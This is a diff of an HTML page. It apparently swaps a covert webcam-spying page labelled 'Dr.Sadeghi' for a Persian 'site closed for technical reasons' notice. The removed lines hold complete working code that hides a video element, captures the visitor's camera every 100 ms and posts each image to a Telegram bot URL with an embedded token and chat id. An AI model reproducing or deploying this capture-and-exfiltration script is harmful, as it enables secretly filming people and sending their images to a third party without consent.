@@ -3,93 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>سایت بسته شده</title>
     <style>
         body {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             margin: 0;
-            background-color: #000;
-            color: #fff;
+            background-color: #282c34;
+            color: #ffffff;
             font-family: Arial, sans-serif;
             text-align: center;
-            position: relative;
         }
-
+        .container {
+            background-color: #1c1e22;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 90%;
+        }
         h1 {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 3rem;
-            color: #fff;
-            font-weight: bold;
-            animation: blink 1s infinite;
+            font-size: 2.5em;
+            margin-bottom: 20px;
         }
-
-        @keyframes blink {
-            0%, 50%, 100% {
-                opacity: 1;
-            }
-            25%, 75% {
-                opacity: 0;
-            }
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
         }
-
-        video, canvas {
-            display: none;
+        .icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            color: #ff6f61;
+        }
+        .button {
+            background-color: #ff6f61;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #e55b50;
         }
     </style>
 </head>
 <body>
-    <h1>Dr.Sadeghi</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-    
-    <script>
-        // درخواست دسترسی به دوربین
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-
-                // گرفتن تصویر از دوربین هر ده ثانیه
-                setInterval(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // تبدیل تصویر به داده Base64
-                    const dataURL = canvas.toDataURL('image/jpeg');
-                    sendImage(dataURL);
-                }, 100); // 10000 میلی‌ثانیه = 10 ثانیه
-            })
-            .catch(error => {
-                console.error('Error accessing the camera:', error);
-            });
-
-        function sendImage(dataURL) {
-            // تبدیل داده Base64 به Blob
-            const base64 = dataURL.split(',')[1];
-            const blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], { type: 'image/jpeg' });
-            const formData = new FormData();
-            formData.append('photo', blob, 'image.jpg');
-
-            fetch('https://api.telegram.org/bot7013140947:AAFmvh85xzVjxiUCJP7IBW92Ex-GmvAxpE8/sendPhoto?chat_id=-1002164811427', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('Image sent successfully:', result);
-            })
-            .catch(error => {
-                console.error('Error sending image:', error);
-            });
-        }
-    </script>
+    <div class="container">
+        <div class="icon">🚫</div>
+        <h1>سایت به دلیل دلایل فنی بسته شده است</h1>
+        <p>متاسفانه به دلیل مشکلات فنی، سایت موقتا در دسترس نیست. لطفاً بعداً مراجعه کنید.</p>
+        <a href="mailto:support@example.com" class="button">تماس با پشتیبانی</a>
+    </div>
 </body>
 </html>
